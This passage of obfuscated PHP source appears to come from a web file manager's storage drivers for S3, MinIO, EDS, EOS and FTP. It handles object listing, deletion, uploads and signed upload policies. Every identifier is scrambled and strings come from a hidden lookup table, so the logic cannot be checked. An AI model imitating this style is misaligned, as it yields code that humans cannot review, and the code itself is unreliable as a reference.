$this->fileList($ĞúãÁ‹); $this->listItemCache = !0; $Ÿğèæº® = trim($ĞúãÁ‹, $ñö¬…©¼[8]) . $ñö¬…©¼[8]; if (!empty($ĞúãÁ‹) && $ĞúãÁ‹ !== $ñö¬…©¼[208] && !in_array($Ÿğèæº®, $æÓæ´İ[$ñö¬…©¼[92]])) { $æÓæ´İ[$ñö¬…©¼[92]][] = $Ÿğèæº®; } $Øƒ·µ±ì = $this->delByBatch($æÓæ´İ[$ñö¬…©¼[93]]); if (!$Øƒ·µ±ì) { return !1; } $Øƒ·µ±ì = $this->delByBatch($æÓæ´İ[$ñö¬…©¼[92]]); if (!$Øƒ·µ±ì) { return !1; } return $this->delFile($Ÿğèæº®); } private function delByBatch($ç‚±Šäø) { foreach (array_chunk($ç‚±Šäø, 1000) as $Ğ¾Ç½ÑÍ) { $½ä”š•º = $this->client->deleteObjects($this->bucket, $Ğ¾Ç½ÑÍ); if (!$½ä”š•º) { return !1; } } return !0; } public function rename($‹€çíÅ‘, $ïğâ–­Ã) { return $this->renameObject($‹€çíÅ‘, $ïğâ–­Ã); } public function listPath($•à€Û¢š, $™Ãşùîî = false) { $âÕ•ı =& $_SERVER[ªÏ§Ë·]; $£ı÷™ = $this->fileList($•à€Û¢š, $âÕ•ı[8], !0); foreach ($£ı÷™[$âÕ•ı[92]] as $†‚¦©ÆÅ => $¬šƒÌÑÛ) { $£ı÷™[$âÕ•ı[92]][$†‚¦©ÆÅ] = $this->folderInfo($¬šƒÌÑÛ, $™Ãşùîî, $¬šƒÌÑÛ); } foreach ($£ı÷™[$âÕ•ı[93]] as $†‚¦©ÆÅ => $¬šƒÌÑÛ) { $£ı÷™[$âÕ•ı[93]][$†‚¦©ÆÅ] = $this->fileInfo($¬šƒÌÑÛ[$âÕ•ı[42]], $™Ãşùîî, $¬šƒÌÑÛ); } return $£ı÷™; } protected function infoChildren($Ö—£–ÍÛ, &$‹—¥•´) { $¥Ûõ™†ò =& $_SERVER[ªÏ§Ë·]; $ê¨«©–ğ = $this->fileList($Ö—£–ÍÛ, $¥Ûõ™†ò[12], !0); $‹—¥•´[$¥Ûõ™†ò[88]] += count($ê¨«©–ğ[$¥Ûõ™†ò[92]]); $‹—¥•´[$¥Ûõ™†ò[87]] += count($ê¨«©–ğ[$¥Ûõ™†ò[93]]); foreach ($ê¨«©–ğ[$¥Ûõ™†ò[93]] as $ »“Ğ¼Â) { if (!$ »“Ğ¼Â || !$ »“Ğ¼Â[$¥Ûõ™†ò[86]]) { continue; } $‹—¥•´[$¥Ûõ™†ò[86]] += $ »“Ğ¼Â[$¥Ûõ™†ò[86]]; } } private function fileInfo($»¨¿ÕÑ , $ãÏË•â” = false, $ñÆì« = array()) { $ªÉ´‘ì =& $_SERVER[ªÏ§Ë·]; $à¬°Œü = array($ªÉ´‘ì[42] => $this->pathThis($»¨¿ÕÑ ), $ªÉ´‘ì[94] => $this->getPathOuter($»¨¿ÕÑ ), $ªÉ´‘ì[43] => $ªÉ´‘ì[210], $ªÉ´‘ì[184] => $this->ext($»¨¿ÕÑ ), $ªÉ´‘ì[86] => isset($ñÆì«[$ªÉ´‘ì[86]]) ? $ñÆì«[$ªÉ´‘ì[86]] : 0); if ($ãÏË•â”) { return $à¬°Œü; } $à¬°Œü[$ªÉ´‘ì[211]] = $à¬°Œü[$ªÉ´‘ì[95]] = 0; $à¬°Œü[$ªÉ´‘ì[212]] = $à¬°Œü[$ªÉ´‘ì[213]] = !0; if (empty($ñÆì«)) { $ñÆì« = $this->objectMeta($»¨¿ÕÑ ); if (!$ñÆì«) { return $à¬°Œü; } } if (isset($ñÆì«[$ªÉ´‘ì[190]])) { $à¬°Œü[$ªÉ´‘ì[95]] = $ñÆì«[$ªÉ´‘ì[190]]; } if (isset($ñÆì«[$ªÉ´‘ì[86]])) { $à¬°Œü[$ªÉ´‘ì[86]] = $ñÆì«[$ªÉ´‘ì[86]]; } return $à¬°Œü; } private function folderInfo($ÊÛ€õí™, $à¥ÅÏĞ = false, $µ°êÖ = array()) { $§—‘Ù† =& $_SERVER[ªÏ§Ë·]; $«·¯¡×• = array($§—‘Ù†[42] => $this->pathThis($ÊÛ€õí™), $§—‘Ù†[94] => $this->getPathOuter($§—‘Ù†[8] . $ÊÛ€õí™), $§—‘Ù†[43] => $§—‘Ù†[85]); if ($à¥ÅÏĞ) { return $«·¯¡×•; } $«·¯¡×•[$§—‘Ù†[211]] = $«·¯¡×•[$§—‘Ù†[95]] = 0; $«·¯¡×•[$§—‘Ù†[212]] = $«·¯¡×•[$§—‘Ù†[213]] = !0; if ($ÊÛ€õí™ == $§—‘Ù†[12]) { return $«·¯¡×•; } if (empty($µ°êÖ)) { $µ°êÖ = $this->objectMeta(trim($ÊÛ€õí™, $§—‘Ù†[8]) . $§—‘Ù†[8]); } if (isset($µ°êÖ[$§—‘Ù†[190]])) { $«·¯¡×•[$§—‘Ù†[211]] = $µ°êÖ[$§—‘Ù†[190]]; } return $«·¯¡×•; } private function fileList($×ÙåŞ, $Á’ş¹ÉŸ = '', $é¦äöùÑ = 0) { $²øî´„Ü =& $_SERVER[ªÏ§Ë·]; $÷Œ“ç“µ = rtrim($×ÙåŞ, $²øî´„Ü[8]) . $²øî´„Ü[8]; $ÒûàÃıú = $this->listObjs($÷Œ“ç“µ, null, null, $Á’ş¹ÉŸ); if (!$ÒûàÃıú) { return array($²øî´„Ü[92] => array(), $²øî´„Ü[93] => array()); } $Ø­ÅÊáÑ = $ú®÷¡ = array(); foreach ($ÒûàÃıú[$²øî´„Ü[214]] as $ó©ËÍ“Ì) { $î¹Ñ¨š = $ó©ËÍ“Ì[$²øî´„Ü[42]]; if ($î¹Ñ¨š == $÷Œ“ç“µ) { continue; } $‚Úœª½™ = isset($ó©ËÍ“Ì[$²øî´„Ü[86]]) ? $ó©ËÍ“Ì[$²øî´„Ü[86]] : 0; $œŸóâ¶£ = $‚Úœª½™ == 0 && substr($î¹Ñ¨š, strlen($î¹Ñ¨š) - 1, 1) == $²øî´„Ü[8] ? !0 : !1; $this->cacheMethodInfoSet($î¹Ñ¨š, $œŸóâ¶£, $ó©ËÍ“Ì); if ($œŸóâ¶£) { $Ø­ÅÊáÑ[] = $î¹Ñ¨š; continue; } $ú®÷¡[] = $é¦äöùÑ ? $ó©ËÍ“Ì : $î¹Ñ¨š; } foreach ($ÒûàÃıú[$²øî´„Ü[215]] as $ó©ËÍ“Ì) { $Ø­ÅÊáÑ[] = $ó©ËÍ“Ì[$²øî´„Ü[42]]; $this->cacheMethodInfoSet($ó©ËÍ“Ì[$²øî´„Ü[42]], !0); } $this->cacheMethodInfoSet($×ÙåŞ, !0); return array($²øî´„Ü[92] => $Ø­ÅÊáÑ, $²øî´„Ü[93] => $ú®÷¡); } private function listObjs($ò¼Ğıó, $ˆ·è¤Æ´ = null, $ì’Ä‡•™ = null, $ßƒáèœí = null) { $…û¢˜İ¿ =& $_SERVER[ªÏ§Ë·]; $ò¼Ğıó = trim($ò¼Ğıó, $…û¢˜İ¿[8]); $º–Ãôà = empty($ò¼Ğıó) && $ò¼Ğıó !== $…û¢˜İ¿[208] ? $…û¢˜İ¿[12] : $ò¼Ğıó . $…û¢˜İ¿[8]; return $this->client->getBucket($this->bucket, $º–Ãôà, $ˆ·è¤Æ´, $ì’Ä‡•™, $ßƒáèœí, !0); } public function has($€ÂÂÏÃŞ, $š”ã×Í¾ = false, $ÊÁËÙĞ× = true) { $‹ö¿»º =& $_SERVER[ªÏ§Ë·]; $€ÂÂÏÃŞ = trim($€ÂÂÏÃŞ, $‹ö¿»º[8]); $ÊĞØÔÊ‡ = empty($€ÂÂÏÃŞ) && $€ÂÂÏÃŞ !== $‹ö¿»º[208] ? $‹ö¿»º[12] : $€ÂÂÏÃŞ . $‹ö¿»º[8]; $ãªµÓ›­ = null; $ÎØ¼‘ = 500; $’è€äñ» = $‹ö¿»º[8]; $€ê‰±Äû = $¶×¬Ó = array(); while (!0) { $çº†§ƒå = $this->listObjs($€ÂÂÏÃŞ, $ãªµÓ›­, $ÎØ¼‘, $’è€äñ»); if (!$çº†§ƒå) { break; } $ãªµÓ›­ = $çº†§ƒå[$‹ö¿»º[216]]; $´ôí†¹¨ = $çº†§ƒå[$‹ö¿»º[214]]; $°ø¼–Ú« = $çº†§ƒå[$‹ö¿»º[215]]; if (empty($´ôí†¹¨) && empty($°ø¼–Ú«)) { break; } if (count($´ôí†¹¨) == 1 && $´ôí†¹¨[0][$‹ö¿»º[42]] == $ÊĞØÔÊ‡) { break; } if ($š”ã×Í¾) { if (count($´ôí†¹¨)) { $´ôí†¹¨ = array_column($´ôí†¹¨, $‹ö¿»º[42]); $€ê‰±Äû = array_merge($€ê‰±Äû, $´ôí†¹¨); } if (count($°ø¼–Ú«)) { $°ø¼–Ú« = array_column($°ø¼–Ú«, $‹ö¿»º[42]); $¶×¬Ó = array_merge($¶×¬Ó, $°ø¼–Ú«); } if ($ãªµÓ›­ === null) { break; } continue; } if ($ÊÁËÙĞ×) { if (!empty($´ôí†¹¨)) { if (count($´ôí†¹¨) > 1 || isset($´ôí†¹¨[0][$‹ö¿»º[42]]) && $´ôí†¹¨[0][$‹ö¿»º[42]] != $ÊĞØÔÊ‡) { return !0; } } } else { if (!empty($°ø¼–Ú«)) { return !0; } } if ($ãªµÓ›­ === null) { break; } } if ($š”ã×Í¾) { $€ê‰±Äû = array_diff($€ê‰±Äû, array($ÊĞØÔÊ‡)); $€ê‰±Äû = count(array_unique($€ê‰±Äû)); $¶×¬Ó = count(array_unique($¶×¬Ó)); return array($‹ö¿»º[217] => $€ê‰±Äû, $‹ö¿»º[218] => $¶×¬Ó); } return !1; } public function listAll($ãÛİ¸ê€) { $¸¨±¯ =& $_SERVER[ªÏ§Ë·]; $€õÌğé— = $this->fileList($ãÛİ¸ê€, $¸¨±¯[12], !0); $Ãƒ¸œ¬ = array_to_keyvalue($€õÌğé—[$¸¨±¯[93]], $¸¨±¯[42]); foreach ($€õÌğé—[$¸¨±¯[92]] as $şÈøáäº) { if (is_string($şÈøáäº)) { $Ãƒ¸œ¬[$şÈøáäº] = array($¸¨±¯[86] => 0); } } return $this->listAllFiles($ãÛİ¸ê€, $Ãƒ¸œ¬); } public function canRead($Ï§îáÌÈ) { $Ş¹¸åŞ =& $_SERVER[ªÏ§Ë·]; $ÁÄ‘ô„ = $this->client->getAccessControlPolicy($this->bucket, $Ï§îáÌÈ); if (!$ÁÄ‘ô„) { return !1; } return in_array($ÁÄ‘ô„, array($Ş¹¸åŞ[219], $Ş¹¸åŞ[220], $Ş¹¸åŞ[221])) ? !0 : !1; } public function canWrite($ô¼Ï) { $»ÌÕúÓæ =& $_SERVER[ªÏ§Ë·]; $óÌÚØÌ = $this->client->getAccessControlPolicy($this->bucket, $ô¼Ï); if (!$óÌÚØÌ) { return !1; } return in_array($óÌÚØÌ, array($»ÌÕúÓæ[219], $»ÌÕúÓæ[220])) ? !0 : !1; } public function getContent($‡øŒøÂ) { return $this->client->getObject($this->bucket, $‡øŒøÂ); } public function setContent($Éà¶ïî, $Â˜ËÎ’§ = '', $şÓÄê¹½ = false) { $€±ĞĞî» =& $_SERVER[ªÏ§Ë·]; $Éà¶ïî = $şÓÄê¹½ ? trim($Éà¶ïî, $€±ĞĞî»[8]) . $€±ĞĞî»[8] : $Éà¶ïî; $ƒ†Úˆäô = get_file_mime(get_path_ext($Éà¶ïî)); $Í—ÉÂ = $this->client->putObject($Â˜ËÎ’§, $this->bucket, $Éà¶ïî, $€±ĞĞî»[209], array(), $ƒ†Úˆäô); if (!$Í—ÉÂ) { return !1; } if ($şÓÄê¹½) { return !0; } $this->cacheMethod(null, null); $Í—ÉÂ = $this->copyFile($Éà¶ïî, $Éà¶ïî, array($€±ĞĞî»[222] => $Í—ÉÂ[$€±ĞĞî»[223]])); return $Í—ÉÂ ? !0 : !1; } public function fileSubstr($Õ»óÛ, $ï­€µûÕ, $ÉÕ›µŞ£) { $€’µˆ†ğ = $ï­€µûÕ + $ÉÕ›µŞ£ - 1; return $this->client->getObject($this->bucket, $Õ»óÛ, array($_SERVER[ªÏ§Ë·][224] => "\x62\x79\164\x65\x73\75{$ï­€µûÕ}\x2d{$€’µˆ†ğ}")); } public function upload($Ï—”¹¶, $¯Œß¹Ê¶, $€×ºòª½ = false, $ê·Ø¶±ç = REPEAT_REPLACE) { $Œò—¦åÆ =& $_SERVER[ªÏ§Ë·]; $æë…§Á¹ = array($Œò—¦åÆ[222] => @md5_file($¯Œß¹Ê¶)); $ï€“ùú = array($Œò—¦åÆ[225] => get_file_mime(get_path_ext($Ï—”¹¶))); if (IO::size($¯Œß¹Ê¶) <= 1024 * 1024 * 200) { $£¿Â‰Õ‰ = $this->client->putObjectFile($¯Œß¹Ê¶, $this->bucket, $Ï—”¹¶, $Œò—¦åÆ[209], $æë…§Á¹, $ï€“ùú); return !empty($£¿Â‰Õ‰) ? $this->getPathOuter($Ï—”¹¶) : !1; } $ìæØß¨ = $this->client->multiUploadObject($¯Œß¹Ê¶, $this->bucket, trim($Ï—”¹¶, $Œò—¦åÆ[8]), $æë…§Á¹, $ï€“ùú); return $ìæØß¨ ? $this->getPathOuter($Ï—”¹¶) : !1; } public function download($“ ë¿ì, $½Ÿ†ÜÅµ) { if (!@is_dir($this->pathFather($½Ÿ†ÜÅµ)) && !IO::mkdir($this->pathFather($½Ÿ†ÜÅµ))) { return !1; } $Ö¡Ùƒœ = $this->client->getObject($this->bucket, $“ ë¿ì, array(), $½Ÿ†ÜÅµ); return $Ö¡Ùƒœ !== !1 ? $½Ÿ†ÜÅµ : !1; } public function link($£ú²§—Å, $ãÊÈ€€³ = array()) { $ĞÚ¹î‹â =& $_SERVER[ªÏ§Ë·]; if ($this->signVer == $ĞÚ¹î‹â[226]) { return $this->client->getAuthenticatedURL($this->bucket, $£ú²§—Å, 3600 * 12, $ãÊÈ€€³); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($£ú²§—Å, $ĞÚ¹î‹â[8]), 3600 * 12, $this->region, array(), !0, $ãÊÈ€€³); } public function fileOut($Şçäóâ, $£Ç »™ = false, $øğËÖï› = false, $¬Š¡Ÿ· = '') { $ŒºĞèíé =& $_SERVER[ªÏ§Ë·]; if ($this->isFileOutServer()) { return $this->fileOutServer($Şçäóâ, $£Ç »™, $øğËÖï›, $¬Š¡Ÿ·); } if (!$øğËÖï›) { $øğËÖï› = $this->pathThis($Şçäóâ); } $ã ÙÄ€¡ = get_file_mime(get_path_ext($øğËÖï›)); if ($ã ÙÄ€¡ == $ŒºĞèíé[227]) { return parent::fileOut($Şçäóâ, $£Ç »™, $øğËÖï›, $¬Š¡Ÿ·); } $¬—Ö½Ì˜ = array($ŒºĞèíé[228] => $ã ÙÄ€¡); if ($£Ç »™) { $¬—Ö½Ì˜[$ŒºĞèíé[229]] = $ŒºĞèíé[230] . rawurlencode($øğËÖï›); } else { } $„òéÕÖ = $this->link($Şçäóâ, $¬—Ö½Ì˜); $this->fileOutLink($„òéÕÖ); } public function fileOutServer($¿÷ıïÓó, $ú —æ« = false, $‘üš»…á = false, $Â×”ş¿ = '') { parent::fileOut($¿÷ıïÓó, $ú —æ«, $‘üš»…á, $Â×”ş¿); } public function fileOutImageServer($›èü¨šñ, $èÀ·ÁŒë = 250) { parent::fileOutImage($›èü¨šñ, $èÀ·ÁŒë); } public function hashMd5($üˆù–£, $î©—Œ€½ = '') { $É³¢›£¹ =& $_SERVER[ªÏ§Ë·]; $ÁÎıÛ£„ = $this->objectMeta($üˆù–£); if (!$ÁÎıÛ£„) { return !1; } $î©—Œ€½ = $î©—Œ€½ ? $î©—Œ€½ : _get($ÁÎıÛ£„, $É³¢›£¹[231]); $î©—Œ€½ = $î©—Œ€½ ? $î©—Œ€½ : _get($ÁÎıÛ£„, $É³¢›£¹[223], $É³¢›£¹[12]); return $î©—Œ€½; } public function uploadFormData($İÉ¤óù», $íÍÃ§ˆ´ = 3600) { $øÚàú´¶ =& $_SERVER[ªÏ§Ë·]; $œ„‡‡“‡ = $this->pathFather($İÉ¤óù»); $‘âÉ€À¼ = $this->client->getHttpUploadPostParams($this->bucket, $œ„‡‡“‡, $øÚàú´¶[209], $íÍÃ§ˆ´); return array_merge((array) $‘âÉ€À¼, array($øÚàú´¶[192] => $this->getHost())); } public function multiUploadFormData($¢ûüà«À, $ºĞ‡‘à² = 3600) { $±‰«Ğó =& $_SERVER[ªÏ§Ë·]; $ºĞªÅÄÍ = gmdate($±‰«Ğó[232]); $øşè˜Œ = array(); $Ş›øï²® = $this->client->getUploadId($this->bucket, $¢ûüà«À, $øşè˜Œ); if (!$Ş›øï²®) { return !1; } return array($±‰«Ğó[233] => $Ş›øï²®, $±‰«Ğó[192] => $this->getHost() . $±‰«Ğó[8] . $this->pathEncode($¢ûüà«À), $±‰«Ğó[234] => $ºĞªÅÄÍ, $±‰«Ğó[104] => $¢ûüà«À); } public function multiUploadAuthData($ÍÈõìÊ, $‹Ù‰«Ö° = array()) { $¤÷‰†ıŒ =& $_SERVER[ªÏ§Ë·]; $Â«¸³¡¼ = isset($‹Ù‰«Ö°[$¤÷‰†ıŒ[234]]) ? $‹Ù‰«Ö°[$¤÷‰†ıŒ[234]] : gmdate($¤÷‰†ıŒ[232]); $ò»È•üŞ = isset($‹Ù‰«Ö°[$¤÷‰†ıŒ[184]]) ? $‹Ù‰«Ö°[$¤÷‰†ıŒ[184]] : $¤÷‰†ıŒ[12]; $Æ×›‚¾è = $‹Ù‰«Ö°[$¤÷‰†ıŒ[104]]; unset($‹Ù‰«Ö°[$¤÷‰†ıŒ[104]]); if (isset($‹Ù‰«Ö°[$¤÷‰†ıŒ[235]])) { $‹Ù‰«Ö°[$¤÷‰†ıŒ[234]] = $Â«¸³¡¼; return $this->listUploadParts($Æ×›‚¾è, $‹Ù‰«Ö°); } $éĞİ×ş² = array($¤÷‰†ıŒ[236], $¤÷‰†ıŒ[12], $¤÷‰†ıŒ[130], $¤÷‰†ıŒ[12], "\170\x2d\141\x6d\172\x2d\144\x61\164\x65\72{$Â«¸³¡¼}", $¤÷‰†ıŒ[8] . $this->bucket . $¤÷‰†ıŒ[8] . $this->pathEncode($Æ×›‚¾è) . $ò»È•üŞ); if (strpos($ò»È•üŞ, $¤÷‰†ıŒ[237]) === 0) { $éĞİ×ş²[0] = $¤÷‰†ıŒ[238]; } if (isset($‹Ù‰«Ö°[$¤÷‰†ıŒ[239]]) && $‹Ù‰«Ö°[$¤÷‰†ıŒ[239]] == $¤÷‰†ıŒ[240]) { $éĞİ×ş²[0] = $¤÷‰†ıŒ[240]; } $«‡¤åÙ¤ = implode($¤÷‰†ıŒ[19], $éĞİ×ş²); $Şï‹»Šƒ = base64_encode(hash_hmac($¤÷‰†ıŒ[241], $«‡¤åÙ¤, $this->secret, !0)); $¹èşØÉÌ = $¤÷‰†ıŒ[242] . $this->accessKey . $¤÷‰†ıŒ[4] . $Şï‹»Šƒ; if (strpos($ò»È•üŞ, $¤÷‰†ıŒ[237]) === 0) { return array($¤÷‰†ıŒ[243] => $¹èşØÉÌ, $¤÷‰†ıŒ[234] => $Â«¸³¡¼); } return $¹èşØÉÌ; } public function listUploadParts($úŠÌŒµº, $Ñ¥ñÚÄ€ = array()) { $Íöª¸‰¶ =& $_SERVER[ªÏ§Ë·]; $ŒÆ½í—Ñ = str_replace($Íöª¸‰¶[244], $Íöª¸‰¶[12], $Ñ¥ñÚÄ€[$Íöª¸‰¶[184]]); $¡‡Ø‡Í = $this->client->listParts($this->bucket, $úŠÌŒµº, $ŒÆ½í—Ñ); if (!$¡‡Ø‡Í) { return !1; } unset($Ñ¥ñÚÄ€[$Íöª¸‰¶[235]], $Ñ¥ñÚÄ€[$Íöª¸‰¶[239]]); $Ñ¥ñÚÄ€[$Íöª¸‰¶[104]] = $úŠÌŒµº; $ŸÍ§¸÷ş = $this->multiUploadAuthData($úŠÌŒµº, $Ñ¥ñÚÄ€); if (empty($ŸÍ§¸÷ş)) { return !1; } return array($Íöª¸‰¶[243] => $ŸÍ§¸÷ş, $Íöª¸‰¶[234] => $Ñ¥ñÚÄ€[$Íöª¸‰¶[234]], $Íöª¸‰¶[245] => $¡‡Ø‡Í); } public function getHost() { return parent::getHost() . $_SERVER[ªÏ§Ë·][8] . $this->bucket; } public function size($òÚ¯¤Üï) { $ÊşÉ—®¬ = $this->objectMeta($òÚ¯¤Üï); return $ÊşÉ—®¬ ? $ÊşÉ—®¬[$_SERVER[ªÏ§Ë·][86]] : 0; } public function info($¯éçÕé¯) { if ($this->isFolder($¯éçÕé¯)) { return $this->folderInfo($¯éçÕé¯); } else { if ($this->isFile($¯éçÕé¯)) { return $this->fileInfo($¯éçÕé¯); } } return !1; } public function exist($§ÂıÛÚ¿) { return $this->isFile($§ÂıÛÚ¿) || $this->isFolder($§ÂıÛÚ¿); } public function isFile($“ºø‚Ã®) { return !$this->isFolder($“ºø‚Ã®) && $this->objectMeta($“ºø‚Ã®); } public function isFolder($Ûí†ìï²) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][175], $Ûí†ìï²); } protected function objectMeta($§Ñ¬ò¡“) { return $this->cacheMethod($_SERVER[ªÏ§Ë·][177], $§Ñ¬ò¡“); } protected function _objectMeta($ÃÔä¡÷Œ) { $ã²–ê²‹ =& $_SERVER[ªÏ§Ë·]; $ÃÔä¡÷Œ = rtrim($ÃÔä¡÷Œ, $ã²–ê²‹[8]); try { $„ÃÈÙ‘á = $this->client->getObjectInfo($this->bucket, $ÃÔä¡÷Œ); if (!isset($„ÃÈÙ‘á[$ã²–ê²‹[231]]) && isset($„ÃÈÙ‘á[$ã²–ê²‹[246]])) { $„ÃÈÙ‘á[$ã²–ê²‹[231]] = $„ÃÈÙ‘á[$ã²–ê²‹[246]]; } } catch (Exception $÷Ş¼¤î«) { $„ÃÈÙ‘á = !1; } if (!$„ÃÈÙ‘á) { } return $„ÃÈÙ‘á; } protected function _isFolder($ş‡úêşí) { $ÒÜ÷•Åı =& $_SERVER[ªÏ§Ë·]; $ş‡úêşí = rtrim($ş‡úêşí, $ÒÜ÷•Åı[8]); if ($ş‡úêşí == $ÒÜ÷•Åı[12] || $ş‡úêşí == $ÒÜ÷•Åı[8]) { return !0; } $Éå×Õ–À = $this->client->getBucket($this->bucket, $ş‡úêşí, null, 1); if (empty($Éå×Õ–À[$ÒÜ÷•Åı[214]])) { return !1; } $ˆê›Ğ¡» = $Éå×Õ–À[$ÒÜ÷•Åı[214]][0][$ÒÜ÷•Åı[42]]; return stripos($ˆê›Ğ¡», $ş‡úêşí . $ÒÜ÷•Åı[8]) === 0 ? !0 : !1; if (substr($ˆê›Ğ¡», -1) == $ÒÜ÷•Åı[8]) { return !0; } if (get_path_this($ˆê›Ğ¡») == get_path_this($ş‡úêşí)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($…ºœ„í) { parent::__construct($…ºœ„í); $this->signatureVersion($_SERVER[ªÏ§Ë·][226]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ô‹, $“ºöŠå½ = 3600) { $°ìĞıÎ™ =& $_SERVER[ªÏ§Ë·]; $ß¤›ŠËˆ = $°ìĞıÎ™[209]; $°ƒÜÖÑ = $°ìĞıÎ™[247]; $„†òœ¢À = $°ìĞıÎ™[72]; $ÎÙ¼ÂÅû = gmdate($°ìĞıÎ™[248]); $ÃÓäÃƒ¥ = gmdate($°ìĞıÎ™[249]); $¸ŒãÏ™° = $°ìĞıÎ™[250]; $ìˆúËÃİ = $“ºöŠå½ . $°ìĞıÎ™[12]; $½š•ÒÊÎ = $°ìĞıÎ™[251]; $´ÎìçÀ = array($this->accessKey, $ÃÓäÃƒ¥, $this->region, $„†òœ¢À, $¸ŒãÏ™°); $øş©˜˜ = implode($°ìĞıÎ™[8], $´ÎìçÀ); $İæ“§Ó = array($°ìĞıÎ™[252] => gmdate($°ìĞıÎ™[253], strtotime($°ìĞıÎ™[254])), $°ìĞıÎ™[255] => array(array($°ìĞıÎ™[256] => $this->bucket), array($°ìĞıÎ™[257] => $ß¤›ŠËˆ), array($°ìĞıÎ™[258], $°ìĞıÎ™[259], $°ìĞıÎ™[12]), array($°ìĞıÎ™[258], $°ìĞıÎ™[260], $°ìĞıÎ™[12]), array($°ìĞıÎ™[258], $°ìĞıÎ™[261], $°ìĞıÎ™[12]), array($°ìĞıÎ™[262] => $½š•ÒÊÎ), array($°ìĞıÎ™[263] => $øş©˜˜), array($°ìĞıÎ™[264] => $°ƒÜÖÑ), array($°ìĞıÎ™[265] => $ÎÙ¼ÂÅû), array($°ìĞıÎ™[266] => $ìˆúËÃİ))); $ùû¥µ±’ = base64_encode(json_encode($İæ“§Ó)); $ßì¡ĞÌ = hash_hmac($°ìĞıÎ™[267], $ÃÓäÃƒ¥, $°ìĞıÎ™[268] . $this->secret, !0); $İñ¾€ª = hash_hmac($°ìĞıÎ™[267], $this->region, $ßì¡ĞÌ, !0); $Íª¶¡‚Ğ = hash_hmac($°ìĞıÎ™[267], $„†òœ¢À, $İñ¾€ª, !0); $ÊÍóéÖ = hash_hmac($°ìĞıÎ™[267], $¸ŒãÏ™°, $Íª¶¡‚Ğ, !0); $ï‡‹Ñ½Ú = hash_hmac($°ìĞıÎ™[267], $ùû¥µ±’, $ÊÍóéÖ); $øÒ¯–şê = array($°ìĞıÎ™[225] => $°ìĞıÎ™[12], $°ìĞıÎ™[269] => $°ìĞıÎ™[12], $°ìĞıÎ™[257] => $ß¤›ŠËˆ, $°ìĞıÎ™[262] => $½š•ÒÊÎ, $°ìĞıÎ™[270] => $ùû¥µ±’, $°ìĞıÎ™[271] => $øş©˜˜, $°ìĞıÎ™[272] => $°ƒÜÖÑ, $°ìĞıÎ™[273] => $ÎÙ¼ÂÅû, $°ìĞıÎ™[274] => $ìˆúËÃİ, $°ìĞıÎ™[275] => $ï‡‹Ñ½Ú, $°ìĞıÎ™[192] => $this->getHost()); return $øÒ¯–şê; } } goto Cµ·ÅŒÀ¦†; b”ÊŞÁ‚‘: class PathDriverEDS extends PathDriverMinIO { public function __construct($„äåâ†) { parent::__construct($„äåâ†); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($²¿ÔÃğ) { parent::__construct($²¿ÔÃğ); $this->signatureVersion($_SERVER[ªÏ§Ë·][226]); } public function uploadFormData($î´„Äœ¨, $ÒıŸßå  = 3600) { $úà§½ÂÆ =& $_SERVER[ªÏ§Ë·]; $˜¨•»Îô = $úà§½ÂÆ[209]; $ªş™—œ’ = $úà§½ÂÆ[247]; $‡æã›Ó = $úà§½ÂÆ[72]; $³üë…È´ = gmdate($úà§½ÂÆ[248]); $¦—ı¶ = gmdate($úà§½ÂÆ[249]); $¤ı»Íâ“ = $úà§½ÂÆ[250]; $»„ˆÜİş = $ÒıŸßå  . $úà§½ÂÆ[12]; $á´Ÿí‹³ = $úà§½ÂÆ[251]; $ª±Ó›Œ‹ = array($this->accessKey, $¦—ı¶, $this->region, $‡æã›Ó, $¤ı»Íâ“); $¼ÂÄâĞ = implode($úà§½ÂÆ[8], $ª±Ó›Œ‹); $³©åÇ—ñ = array($úà§½ÂÆ[252] => gmdate($úà§½ÂÆ[1350], strtotime($úà§½ÂÆ[254])), $úà§½ÂÆ[255] => array(array($úà§½ÂÆ[256] => $this->bucket), array($úà§½ÂÆ[257] => $˜¨•»Îô), array($úà§½ÂÆ[258], $úà§½ÂÆ[259], $úà§½ÂÆ[12]), array($úà§½ÂÆ[258], $úà§½ÂÆ[260], $úà§½ÂÆ[12]), array($úà§½ÂÆ[258], $úà§½ÂÆ[261], $úà§½ÂÆ[12]), array($úà§½ÂÆ[262] => $á´Ÿí‹³), array($úà§½ÂÆ[263] => $¼ÂÄâĞ), array($úà§½ÂÆ[264] => $ªş™—œ’), array($úà§½ÂÆ[265] => $³üë…È´), array($úà§½ÂÆ[266] => $»„ˆÜİş))); $ ©˜ÑŠá = base64_encode(json_encode($³©åÇ—ñ)); $²¼›ì¼ş = hash_hmac($úà§½ÂÆ[267], $¦—ı¶, $úà§½ÂÆ[268] . $this->secret, !0); $ËÃÕüÀ£ = hash_hmac($úà§½ÂÆ[267], $this->region, $²¼›ì¼ş, !0); $Õ“«¯êî = hash_hmac($úà§½ÂÆ[267], $‡æã›Ó, $ËÃÕüÀ£, !0); $Œ¬»¢Ä‹ = hash_hmac($úà§½ÂÆ[267], $¤ı»Íâ“, $Õ“«¯êî, !0); $ºÈÒ€‰Ğ = hash_hmac($úà§½ÂÆ[267], $ ©˜ÑŠá, $Œ¬»¢Ä‹); $µíó¯Ê‹ = array($úà§½ÂÆ[225] => $úà§½ÂÆ[12], $úà§½ÂÆ[269] => $úà§½ÂÆ[12], $úà§½ÂÆ[257] => $˜¨•»Îô, $úà§½ÂÆ[262] => $á´Ÿí‹³, $úà§½ÂÆ[270] => $ ©˜ÑŠá, $úà§½ÂÆ[271] => $¼ÂÄâĞ, $úà§½ÂÆ[272] => $ªş™—œ’, $úà§½ÂÆ[273] => $³üë…È´, $úà§½ÂÆ[274] => $»„ˆÜİş, $úà§½ÂÆ[275] => $ºÈÒ€‰Ğ, $úà§½ÂÆ[192] => $this->getHost()); return $µíó¯Ê‹; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($À˜ô„³È) { parent::__construct(); if (count($À˜ô„³È) > 0) { $this->_init($À˜ô„³È); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¬£×„‚Ô) { $¹ÌŸÎæª =& 